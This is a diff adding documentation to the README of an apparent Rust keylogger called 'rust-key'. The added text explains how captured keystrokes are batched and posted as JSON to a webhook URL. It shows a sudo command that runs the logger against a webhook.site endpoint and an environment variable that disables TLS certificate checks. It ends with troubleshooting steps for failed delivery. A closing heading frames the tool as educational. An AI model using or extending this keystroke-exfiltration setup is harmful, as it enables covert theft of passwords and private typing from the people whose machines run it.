@@ -138,6 +138,44 @@ When a webhook URL is provided, keystrokes are sent in batches as JSON POST requ
 Batching configuration:
 - **Batch size**: 20 keystrokes per request
 - **Timeout**: 2 seconds (sends partial batch if no new keys)
+- **Connection timeout**: 10 seconds
+- **Certificate validation**: Enabled by default (secure mode)
+
+⚠️ **TLS Certificate Validation**: By default, the keylogger uses strict TLS certificate validation to protect against man-in-the-middle attacks. If you're using webhook testing services with self-signed certificates, you can disable validation:
+
+```bash
+export RUST_KEY_ACCEPT_INVALID_CERTS=true
+sudo ./target/release/rust-key https://webhook.site/your-test-id
+```
+
+**Security Warning**: Only disable certificate validation for testing purposes. For production use with real keystroke data, always use properly signed TLS certificates and keep validation enabled (default).
+
+### Webhook Troubleshooting
+
+If your webhook isn't receiving data, check the `keylog.txt` file for diagnostic messages:
+
+```bash
+grep "WEBHOOK:" keylog.txt
+```
+
+Common issues and solutions:
+
+1. **Initial connectivity test failed**
+   - Check if the webhook URL is correct and accessible
+   - Verify your network connection and firewall settings
+   - Ensure the webhook service is running
+
+2. **Failed to send batch to webhook**
+   - DNS resolution issues: Verify the hostname resolves correctly
+   - Network connectivity: Check if you can reach the endpoint with curl
+   - Endpoint errors: The webhook service might be returning errors
+
+3. **HTTP non-2xx status codes**
+   - Check webhook service logs for error details
+   - Verify the endpoint accepts POST requests with JSON payloads
+   - Ensure Content-Type: application/json is acceptable
+
+The keylogger will continue to log keystrokes to file even if webhook delivery fails.
 
 ## Educational Use Cases
 
